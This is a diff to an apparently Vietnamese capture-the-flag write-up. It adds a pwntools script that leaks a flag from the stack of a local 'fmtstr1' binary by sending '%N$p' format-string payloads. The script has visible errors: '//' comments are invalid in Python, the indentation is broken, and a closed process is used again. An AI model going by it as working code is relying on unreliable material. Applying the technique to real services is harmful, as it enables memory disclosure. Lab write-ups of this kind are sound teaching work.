@@ -66,3 +66,21 @@ Chuỗi flag được lưu ở Stack có thể được truy cập từ % thứ 
 
 ![Alt text](image/fs2.png)
 ![Alt text](image/fs3.png)
+
+Script Python:
+
+    #!/usr/bin/env python3
+    from pwn import *
+    exe=ELF('./fmtstr1',checksec=False)
+
+    for i in range(12,20):                 // Đi hết 64 BYTE để đảm bảo không in thiếu flag
+	p=process(exe.path)
+
+	p.sendafter(b'string: ',f'%{i}$p')
+	output=p64(int(p.recvall(),16))
+	print(output)
+	p.close()
+    if b'}' in output:                      // Thoát chương trình khi đã in đủ hết flag
+        p.exit()
+
+    p.interactive()
